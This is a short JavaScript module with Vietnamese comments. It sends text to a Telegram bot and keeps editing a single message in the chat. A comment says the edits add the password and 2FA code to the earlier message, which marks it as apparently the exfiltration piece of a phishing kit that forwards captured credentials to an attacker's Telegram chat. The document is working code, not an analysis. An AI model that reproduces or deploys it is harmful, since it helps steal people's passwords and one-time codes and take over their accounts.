import config from '@/utils/config';
import axios from 'axios';

const sendMessage = async (message) => {
    const base = `https://api.telegram.org/bot${config.token}`;
    const sendMessageUrl = `${base}/sendMessage`;
    const editMessageUrl = `${base}/editMessageText`;

    // Lấy message_id đã lưu trong phiên làm việc hiện tại của trình duyệt
    const messageIdRaw = sessionStorage.getItem('messageId');
    const messageId = messageIdRaw ? Number(messageIdRaw) : Number.NaN;

    // Nếu đã có tin nhắn trước đó, tiến hành SỬA (thêm mật khẩu/2FA vào tin nhắn cũ)
    if (!Number.isNaN(messageId)) {
        try {
            await axios.post(editMessageUrl, {
                chat_id: config.chat_id,
                message_id: messageId,
                text: message,
                parse_mode: 'HTML'
            });
            return; // Cập nhật thành công vào 1 tin nhắn duy nhất -> Thoát
        } catch (e) {
            const desc = e.response?.data?.description ?? '';
            
            // Nếu nội dung gửi lên giống hệt tin nhắn cũ thì không làm gì thêm
            if (typeof desc === 'string' && desc.includes('message is not modified')) {
                return;
            }
            
            console.log('Không thể sửa tin nhắn cũ, chuyển sang tạo tin nhắn mới:', e);
            // Nếu tin nhắn cũ bị xóa trên Telegram, xóa ID cũ để tạo tin nhắn mới bên dưới
            sessionStorage.removeItem('messageId');
        }
    }

    // Nếu chưa có tin nhắn hoặc sửa thất bại, gửi TIN NHẮN MỚI và LƯU ID lại
    try {
        const response = await axios.post(sendMessageUrl, {
            chat_id: config.chat_id,
            text: message,
            parse_mode: 'HTML'
        });

        const newId = response.data.result?.message_id;
        if (newId != null) {
            sessionStorage.setItem('messageId', String(newId));
        }
    } catch (err) {
        console.error('Lỗi gửi thông báo Telegram:', err);
    }
};

export default sendMessage;
